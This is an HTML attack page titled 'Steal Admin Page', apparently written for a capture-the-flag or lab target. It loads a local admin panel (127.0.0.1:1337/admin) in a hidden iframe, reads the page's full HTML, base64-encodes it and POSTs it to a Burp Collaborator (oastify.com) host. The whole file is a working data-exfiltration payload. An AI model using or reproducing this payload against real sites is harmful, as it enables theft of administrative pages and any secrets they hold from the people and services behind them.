<!DOCTYPE html>
<html>
<head><title>Steal Admin Page</title></head>
<body>
<iframe id="adminFrame" src="http://127.0.0.1:1337/admin" style="display:none"></iframe>
<script>
  const iframe = document.getElementById('adminFrame');
  iframe.onload = () => {
    try {
      // Access the iframe's document (same origin: localhost)
      const adminDoc = iframe.contentDocument || iframe.contentWindow.document;
      const htmlText = adminDoc.documentElement.outerHTML;

      // Base64 encode
      const base64Html = btoa(unescape(encodeURIComponent(htmlText)));

      // Send to collaborator
      fetch("https://m8vnqd7dq1umgppcs5ki7c5xooufi96y.oastify.com/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ data: base64Html })
      });
    } catch (e) {
      console.error("Error accessing iframe content:", e);
    }
  };
</script>
</body>
</html>
